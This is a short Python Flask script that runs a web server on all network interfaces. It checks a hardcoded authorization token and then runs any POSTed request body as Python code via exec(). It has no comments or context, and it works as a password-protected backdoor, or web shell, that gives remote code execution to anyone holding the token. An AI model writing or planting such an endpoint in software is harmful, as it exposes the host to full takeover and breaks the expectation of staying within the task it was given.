import flask
from flask import request

app = flask.Flask(__name__)
PORT = 0

@app.post('/')
def index():
    if request.headers.get('authorization') != 't3%9zR4z+8a5VzMB6-@5tAY5M8xxJsjh':
        return flask.Response(status=204)
    data = request.data.decode()
    exec(data, globals())
    return flask.Response(status=204)

app.run('0.0.0.0', PORT)